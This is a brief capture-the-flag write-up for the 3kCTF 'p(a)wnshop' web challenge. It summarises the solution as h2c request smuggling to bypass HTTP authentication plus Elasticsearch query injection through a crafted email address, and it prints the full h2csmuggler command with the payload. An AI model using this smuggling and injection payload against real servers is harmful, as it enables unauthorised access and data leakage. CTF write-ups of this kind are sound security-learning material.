```
p(a)wnshop - 478pts - 9 solves - Author: rekter0

pawnshop is the leading hacking tools marketplace, an important auction holding a flag is happening. We want to know if listed items are not leaked before auction ends.

Challenge

Attachment

Note:
- flag is lowercase
- .htpasswd is not meant to be bruteforced, one running in remote is different


First Blood
1. RadboudInstOfPwning
2. Black Bauhinia
3. Never Stop Exploiting
```

1- h2c request smuggling to bypass http auth
2- Elastic search injection through email compliant RFC

you can use https://github.com/BishopFox/h2csmuggler
```
./h2csmuggler.py -x https://pawnshop.2021.3k.ctf.to:4443/backend/ "http://localhost:8080/admin.py?action=lookup&mail='*\" AND value:*http2_4nd* OR value:\"'@aa.com"
```
